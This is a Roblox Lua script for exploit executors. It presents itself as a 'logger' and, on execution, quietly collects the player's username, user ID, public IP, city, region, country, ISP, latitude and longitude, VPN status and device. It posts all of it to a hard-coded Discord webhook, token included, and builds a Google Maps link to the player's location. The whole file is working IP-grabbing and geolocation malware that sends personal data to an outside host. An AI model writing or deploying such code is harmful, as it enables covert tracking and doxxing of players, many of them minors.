local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

local WEBHOOK = "https://discord.com/api/webhooks/1476453785076502699/3hd_1nta4ABJoaljV91elvIrjENgJJtRStrQuRjFhwB1--fp6fQc6W_G9x4FJ3DOnzkw"

-- =====================================================================
-- LOGGER (versión limpia - solo logging)
-- =====================================================================

local function requestFunc()
    return (syn and syn.request)
        or http_request
        or request
        or (fluxus and fluxus.request)
        or (Krnl and Krnl.request)
        or httprequest
end

local req = requestFunc()
if not req then
    warn("❌ No HTTP support detected")
    return
end

local device = UserInputService.TouchEnabled and "Móvil" or "PC"
local system = UserInputService.TouchEnabled and "Android/iOS" or "Windows"

local executor = "Desconocido"
if identifyexecutor then 
    executor = identifyexecutor() 
end

local function getTime()
    return os.date("%d/%m/%Y %H:%M:%S")
end

-- Info del juego
local placeId = game.PlaceId
local gameName = "Desconocido"
local gamePageLink = "No disponible"

pcall(function()
    local info = MarketplaceService:GetProductInfo(placeId)
    if info and info.Name then
        gameName = info.Name
        gamePageLink = "[Ver página del juego](https://www.roblox.com/games/" .. placeId .. "/" .. HttpService:UrlEncode(gameName:gsub(" ", "-")) .. ")"
    end
end)

-- Geo + Lat/Lon + VPN
local function getIPAndGeo()
    local apis = {
        {url = "https://get.geojs.io/v1/ip/geo.json", parse = function(d)
            return {
                ip = d.ip or "?",
                city = d.city or "?",
                region = d.region or "?",
                country = d.country or "?",
                isp = d.organization_name or "?",
                lat = tonumber(d.latitude),
                lon = tonumber(d.longitude),
                vpn = false,
                threat = "?"
            }
        end},
        {url = "https://ipwhois.io/json", parse = function(d)
            local sec = d.security or {}
            local vpnDetected = sec.vpn or sec.proxy or sec.tor or false
            return {
                ip = d.ip or "?",
                city = d.city or "?",
                region = d.region or "?",
                country = d.country or "?",
                isp = d.isp or "?",
                lat = d.latitude,
                lon = d.longitude,
                vpn = vpnDetected,
                threat = vpnDetected and "Detectado ⚠️" or "No"
            }
        end}
    }

    for _, api in apis do
        local s, r = pcall(req, {Url = api.url, Method = "GET"})
        if s and r and r.StatusCode == 200 and r.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
            if ok and data then
                local g = api.parse(data)
                if g and g.ip ~= "?" then return g end
            end
        end
    end
    
    return {ip = "?", city = "?", region = "?", country = "?", isp = "?", lat = nil, lon = nil, vpn = false, threat = "?"}
end

local geo = getIPAndGeo()

local latText = geo.lat and string.format("%.6f", geo.lat) or "?"
local lonText = geo.lon and string.format("%.6f", geo.lon) or "?"

local mapsLink = "No disponible"
if geo.lat and geo.lon then
    mapsLink = "[Ver en Google Maps](https://www.google.com/maps/search/?api=1&query=" .. geo.lat .. "," .. geo.lon .. ")"
elseif geo.city ~= "?" and geo.country ~= "?" then
    local q = geo.city .. ", " .. (geo.region ~= "?" and geo.region .. ", " or "") .. geo.country
    mapsLink = "[Buscar zona en Maps](https://www.google.com/maps/search/?api=1&query=" .. HttpService:UrlEncode(q) .. ")"
end

local vpnAlert = geo.vpn and "⚠️ VPN / Proxy DETECTADO ⚠️" or "No se detectó VPN"
local color = geo.vpn and 16711680 or 16776960   -- rojo o amarillo

local embed = {
    title = "🟡 EJECUCIÓN REGISTRADA",
    description = "**" .. vpnAlert .. "**\nUbicación aproximada por IP",
    color = color,
    fields = {
        {name = "👤 Usuario",          value = player.Name or "?", inline = true},
        {name = "📛 DisplayName",      value = player.DisplayName or "?", inline = true},
        {name = "🆔 User ID",          value = tostring(player.UserId or "?"), inline = true},
        {name = "🌐 IP Pública",       value = geo.ip, inline = true},
        {name = "📍 Ciudad aprox.",    value = geo.city, inline = true},
        {name = "🏠 Región / Estado",  value = geo.region or "?", inline = true},
        {name = "🌍 País",             value = geo.country, inline = true},
        {name = "🛰️ ISP",             value = geo.isp or "?", inline = true},
        {name = "🌐 Latitud",          value = latText, inline = true},
        {name = "🌐 Longitud",         value = lonText, inline = true},
        {name = "🔒 VPN / Proxy / Tor",value = vpnAlert, inline = false},
        {name = "💻 Dispositivo",      value = device .. " (" .. system .. ")", inline = true},
        {name = "⚙️ Executor",         value = executor, inline = true},
        {name = "🎮 Juego",            value = gameName, inline = false},
        {name = "🆔 Place ID",         value = tostring(placeId), inline = true},
        {name = "🔗 Página del juego", value = gamePageLink, inline = false},
        {name = "🗺️ Google Maps",     value = mapsLink, inline = false},
        {name = "🕒 Hora",             value = getTime(), inline = false},
    },
    footer = {text = "Ubicación aproximada • No calle exacta"},
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    req({
        Url = WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({embeds = {embed}})
    })
end)

print("Logger enviado | IP: " .. geo.ip .. " | Lat: " .. latText .. " | Lon: " .. lonText)
